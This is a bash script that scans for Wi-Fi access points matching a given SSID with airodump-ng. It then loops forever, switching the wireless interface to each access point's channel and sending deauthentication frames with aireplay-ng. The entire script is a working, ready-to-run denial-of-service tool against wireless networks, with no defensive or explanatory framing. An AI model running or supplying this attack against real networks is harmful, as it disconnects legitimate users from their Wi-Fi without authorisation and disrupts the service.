#!/bin/bash

# Check if the script is run with root privileges
if [ "$(id -u)" -ne 0 ]; then
  echo "Please run the script as root (sudo)."
  exit 1
fi

# Function to set the wireless interface to a specific channel
set_channel() {
  local channel="$1"
  
  echo "Setting wireless interface to channel $channel"
  
  # Set wireless interface to the specified channel
  iwconfig wlan0 channel "$channel"
}

# Function to perform deauthentication on a given BSSID and channel
perform_deauth() {
  local bssid="$1"
  local channel="$2"
  local skip_beacon="$3"
  
  echo "Launching deauthentication attack on BSSID: $bssid, Channel: $channel"
  
  # Launch deauthentication attack with 10 frames
  if [ "$skip_beacon" == true ]; then
    aireplay-ng --deauth 10 -a "$bssid" -D wlan0
  else
    aireplay-ng --deauth 10 -a "$bssid" wlan0
  fi
}

# Main script starts here

# Check if the SSID is provided as an argument
if [ -z "$1" ]; then
  echo "Usage: $0 <SSID> [optional: -D]"
  exit 1
fi

# Set the SSID from the command line argument
SSID="$1"

# Check for the optional -D flag
skip_beacon=false
if [ "$2" == "-D" ]; then
  skip_beacon=true
fi

# Start airodump-ng in a new terminal window to scan for APs with the specified SSID
gnome-terminal --geometry=80x20+0+0 -- airodump-ng --essid "$SSID" --output-format csv -w scan_results wlan0

# Display prompt without a newline
echo -n "Press Enter when ready to launch deauthentication attack..."

# Wait for user input to continue
read -r

# Kill the airodump-ng process in the new terminal window
pkill -f "airodump-ng --essid $SSID"

while true; do
  # Extract the latest scan results file
  latest_scan_results=$(ls -t scan_results-*.csv | head -n 1)
  
  # Extract BSSIDs and channels from the latest scan results
  grep "$SSID" "$latest_scan_results" | cut -d ',' -f 1,4 | while IFS=, read -r bssid channel; do
    # Set the wireless interface to the channel
    set_channel "$channel"
    
    # Perform deauthentication for each BSSID and channel in the foreground
    perform_deauth "$bssid" "$channel" "$skip_beacon"
    
    # Sleep for a short duration before the next attack
    sleep 5
  done
done
